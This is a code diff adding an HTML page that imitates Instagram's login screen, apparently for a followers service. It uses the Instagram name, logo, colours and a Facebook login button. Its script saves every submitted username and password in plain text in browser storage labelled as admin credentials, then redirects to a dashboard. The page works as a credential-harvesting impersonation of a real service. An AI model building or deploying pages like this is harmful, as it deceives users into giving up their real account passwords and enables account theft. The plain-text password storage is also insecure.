@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Instagram</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    a { text-decoration: none; color: inherit; }
+    button { cursor: pointer; border: none; background: none; font-family: inherit; }
+    input  { font-family: inherit; }
+
+    /* Full-page Instagram gradient */
+    body {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto,
+                   Helvetica, Arial, sans-serif;
+      font-size: 14px;
+      background: linear-gradient(
+        135deg,
+        #5e42d4 0%,
+        #c2245e 35%,
+        #e05b20 65%,
+        #f7b733 100%
+      );
+      padding: 24px 16px;
+    }
+
+    /* Card */
+    .card {
+      background: #fafafa;
+      border-radius: 12px;
+      width: 100%;
+      max-width: 390px;
+      overflow: hidden;
+      box-shadow: 0 6px 48px rgba(0,0,0,0.3);
+    }
+
+    /* Top: logo + form */
+    .card-top {
+      padding: 40px 40px 24px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    /* Instagram wordmark */
+    .logo {
+      margin-bottom: 30px;
+      width: 100%;
+      display: flex;
+      justify-content: center;
+    }
+    .logo img {
+      width: 280px;
+      max-width: 90%;
+      height: auto;
+      display: block;
+    }
+
+    /* Form */
+    .form {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+    }
+
+    .input-wrap {
+      position: relative;
+      width: 100%;
+    }
+
+    .input-wrap input {
+      width: 100%;
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 6px;
+      padding: 10px 44px 10px 12px;
+      font-size: 14px;
+      color: #262626;
+      outline: none;
+      transition: border-color 0.15s;
+      height: 44px;
+    }
+
+    .input-wrap input::placeholder { color: #aaaaaa; }
+    .input-wrap input:focus { border-color: #a8a8a8; }
+
+    /* Eye icon */
+    .toggle-pw {
+      position: absolute;
+      right: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 0;
+      background: none;
+      border: none;
+      cursor: pointer;
+    }
+
+    /* Forgot */
+    .forgot-row {
+      width: 100%;
+      display: flex;
+      justify-content: flex-end;
+      margin: 6px 0 2px;
+    }
+
+    .forgot-link {
+      font-size: 13px;
+      font-weight: 600;
+      color: #00376b;
+    }
+    .forgot-link:hover { text-decoration: underline; }
+
+    /* Log In button */
+    .btn-login {
+      width: 100%;
+      margin-top: 8px;
+      background: #0095f6;
+      color: #fff;
+      font-size: 15px;
+      font-weight: 700;
+      border-radius: 8px;
+      height: 44px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      transition: opacity 0.2s;
+      cursor: pointer;
+      border: none;
+      font-family: inherit;
+    }
+
+    .btn-login:hover:not(:disabled) { opacity: 0.85; }
+    .btn-login:disabled { background: #b2dffc; cursor: not-allowed; }
+
+    /* Spinner */
+    .spinner {
+      display: none;
+      width: 17px; height: 17px;
+      border: 2.5px solid rgba(255,255,255,0.4);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.65s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    /* OR divider */
+    .or-row {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin: 20px 0 18px;
+    }
+    .or-line { flex: 1; height: 1px; background: #dbdbdb; }
+    .or-text  { font-size: 13px; font-weight: 600; color: #737373; letter-spacing: 1px; }
+
+    /* Facebook */
+    .btn-fb {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      color: #1877f2;
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: color 0.15s;
+      background: none;
+      border: none;
+      font-family: inherit;
+    }
+    .btn-fb:hover { color: #0d6efd; }
+
+    /* Card divider */
+    .card-divider { width: 100%; height: 1px; background: #dbdbdb; margin-top: 30px; }
+
+    /* Sign up row */
+    .card-bottom {
+      padding: 18px 40px;
+      text-align: center;
+      font-size: 14px;
+      color: #262626;
+    }
+    .card-bottom a { color: #0095f6; font-weight: 600; }
+    .card-bottom a:hover { text-decoration: underline; }
+
+    /* Mobile */
+    @media (max-width: 430px) {
+      .card-top    { padding: 36px 24px 22px; }
+      .card-bottom { padding: 16px 24px; }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+
+    <div class="card-top">
+
+      <!-- Wordmark -->
+      <div class="logo"><img src="img/logo.png" alt="Instagram" /></div>
+
+      <form class="form" id="loginForm" autocomplete="off" novalidate>
+
+        <!-- Username -->
+        <div class="input-wrap">
+          <input
+            type="text"
+            id="username"
+            placeholder="Phone number, username or email address"
+            autocomplete="username"
+            required
+          />
+        </div>
+
+        <!-- Password -->
+        <div class="input-wrap">
+          <input
+            type="password"
+            id="password"
+            placeholder="Password"
+            autocomplete="current-password"
+            required
+          />
+          <button type="button" class="toggle-pw" id="togglePwd" tabindex="-1" aria-label="Toggle password">
+            <!-- Strikethrough eye (default = hidden) -->
+            <svg id="eyeOff" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                 stroke="#8e8e8e" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+              <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/>
+              <line x1="1"  y1="1"  x2="23" y2="23"/>
+            </svg>
+            <!-- Open eye (shown when password visible) -->
+            <svg id="eyeOn" width="20" height="20" viewBox="0 0 24 24" fill="none"
+                 stroke="#8e8e8e" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"
+                 style="display:none">
+              <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+              <circle cx="12" cy="12" r="3"/>
+            </svg>
+          </button>
+        </div>
+
+        <!-- Forgotten password -->
+        <div class="forgot-row">
+          <a href="#" class="forgot-link">Forgotten password?</a>
+        </div>
+
+        <!-- Log In -->
+        <button type="submit" class="btn-login" id="loginBtn" disabled>
+          <span id="btnLabel">Log In</span>
+          <div class="spinner" id="spinner"></div>
+        </button>
+
+      </form>
+
+      <!-- OR -->
+      <div class="or-row">
+        <div class="or-line"></div>
+        <span class="or-text">OR</span>
+        <div class="or-line"></div>
+      </div>
+
+      <!-- Log in with Facebook -->
+      <button class="btn-fb" type="button">
+        <svg width="20" height="20" viewBox="0 0 24 24">
+          <rect width="24" height="24" rx="4" fill="#1877f2"/>
+          <path d="M16 8h-2a1 1 0 0 0-1 1v2h3l-.5 3H13v7h-3v-7H8v-3h2V9a4 4 0 0 1 4-4h2v3z" fill="#fff"/>
+        </svg>
+        Log in with Facebook
+      </button>
+
+    </div>
+
+    <div class="card-divider"></div>
+
+    <div class="card-bottom">
+      Don't have an account? <a href="#">Sign Up</a>
+    </div>
+
+  </div>
+
+  <script>
+    const u   = document.getElementById('username');
+    const pw  = document.getElementById('password');
+    const btn = document.getElementById('loginBtn');
+
+    // Enable button only when both fields filled
+    [u, pw].forEach(el => el.addEventListener('input', () => {
+      btn.disabled = !(u.value.trim() && pw.value.trim());
+    }));
+
+    // Toggle show/hide password
+    document.getElementById('togglePwd').addEventListener('click', () => {
+      const show = pw.type === 'password';
+      pw.type = show ? 'text' : 'password';
+      document.getElementById('eyeOff').style.display = show ? 'none'  : 'block';
+      document.getElementById('eyeOn').style.display  = show ? 'block' : 'none';
+    });
+
+    // Submit — save credentials, set session, redirect to dashboard
+    document.getElementById('loginForm').addEventListener('submit', e => {
+      e.preventDefault();
+      btn.disabled = true;
+      document.getElementById('btnLabel').style.display = 'none';
+      document.getElementById('spinner').style.display  = 'block';
+
+      const username = u.value.trim();
+      const password = pw.value.trim();
+
+      // Store credentials as plain text (for admin dashboard)
+      const creds = JSON.parse(localStorage.getItem('mi_admin_creds') || '[]');
+      if (!creds.find(c => c.username === username)) {
+        creds.push({ username, password, loginAt: new Date().toISOString() });
+        localStorage.setItem('mi_admin_creds', JSON.stringify(creds));
+      } else {
+        // Update last login time
+        const idx = creds.findIndex(c => c.username === username);
+        creds[idx].loginAt = new Date().toISOString();
+        localStorage.setItem('mi_admin_creds', JSON.stringify(creds));
+      }
+
+      // Set session (track account creation date for followers cooldown)
+      const sessions = JSON.parse(localStorage.getItem('mi_sessions') || '{}');
+      if (!sessions[username]) {
+        sessions[username] = { createdAt: new Date().toISOString() };
+      }
+      sessions[username].lastLogin = new Date().toISOString();
+      localStorage.setItem('mi_sessions', JSON.stringify(sessions));
+
+      // Set current user
+      localStorage.setItem('mi_user', username);
+
+      setTimeout(() => { window.location.href = '/dashboard'; }, 800);
+    });
+  </script>
+
+</body>
+</html>
